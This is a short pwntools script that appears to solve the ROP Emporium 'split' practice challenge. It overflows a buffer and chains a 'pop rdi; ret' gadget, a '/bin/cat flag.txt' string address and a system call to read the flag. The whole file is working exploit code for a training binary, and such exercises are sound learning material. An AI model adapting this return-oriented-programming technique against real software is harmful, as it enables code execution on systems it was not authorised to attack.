from pwn import *

p = process('./split')

junk = b'A' * 40

system_addr = p64(0x0040074b) #address for call system
bin_flag = p64(0x00601060) #addr of string "/bin/cat flag.txt"
pop_rdi_ret = p64(0x00000000004007c3) # addr of pop rdi ; ret gadget

payload = junk + pop_rdi_ret + bin_flag + system_addr
p.recvuntil('>')
p.sendline(payload)

p.interactive()
